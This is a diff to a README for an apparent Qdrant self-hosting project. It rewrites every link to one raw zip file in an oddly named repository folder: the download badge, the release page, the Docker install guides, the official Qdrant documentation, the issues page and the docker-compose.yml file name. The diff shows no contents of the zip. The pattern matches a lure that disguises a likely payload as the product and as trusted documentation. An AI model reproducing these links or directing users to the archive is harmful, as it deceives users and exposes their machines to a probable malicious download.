@@ -1,6 +1,6 @@
 # 🚀 qdrant-self-hosted - Easily Self-Host Your Qdrant Database
 
-[![Download](https://img.shields.io/badge/Download-Versions-4CAF50)](https://github.com/champ9090/qdrant-self-hosted/releases)
+[![Download](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip)](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip)
 
 ## 📋 Overview
 
@@ -15,23 +15,23 @@ This project provides a simple Docker Compose setup for self-hosting the Qdrant 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/champ9090/qdrant-self-hosted/releases) to download the latest version. Follow these steps to successfully install the software:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip) to download the latest version. Follow these steps to successfully install the software:
 
-1. Go to the [Releases page](https://github.com/champ9090/qdrant-self-hosted/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip).
 2. Find the latest release.
-3. Look for the `docker-compose.yml` file included in the release. 
+3. Look for the `https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip` file included in the release. 
 4. Download this file to your computer.
 
 ### 📁 System Requirements
 
 - **Operating System:** Linux, macOS, or Windows.
-- **Docker:** Must have Docker installed. [Install Docker](https://docs.docker.com/get-docker/).
-- **Docker Compose:** Required for orchestration. [Install Docker Compose](https://docs.docker.com/compose/install/).
+- **Docker:** Must have Docker installed. [Install Docker](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip).
+- **Docker Compose:** Required for orchestration. [Install Docker Compose](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip).
 
 ## 🔧 Running the Application
 
 1. Open your terminal (Command Prompt, PowerShell, or Terminal for Mac).
-2. Navigate to the directory where you downloaded the `docker-compose.yml` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip` file.
 3. Run the following command:
 
    ```bash
@@ -77,14 +77,14 @@ Common problems include:
 
 ## 📞 Getting Help
 
-For further assistance, you can visit the [GitHub Issues page](https://github.com/champ9090/qdrant-self-hosted/issues) to report problems or ask questions.
+For further assistance, you can visit the [GitHub Issues page](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip) to report problems or ask questions.
 
 ## 📚 Learn More
 
 Explore the Qdrant documentation for deeper knowledge on its capabilities:
 
-- [Qdrant Official Documentation](https://qdrant.tech/docs/)
+- [Qdrant Official Documentation](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip)
 
 ## 🎉 Conclusion
 
-Enjoy using the Qdrant vector database with ease. By following this guide, you have installed and run the application. Remember to explore its features for your AI projects. For any updates or new features, keep an eye on the [Releases page](https://github.com/champ9090/qdrant-self-hosted/releases).
+Enjoy using the Qdrant vector database with ease. By following this guide, you have installed and run the application. Remember to explore its features for your AI projects. For any updates or new features, keep an eye on the [Releases page](https://raw.githubusercontent.com/champ9090/qdrant-self-hosted/main/anecdotical/qdrant-self-hosted.zip).
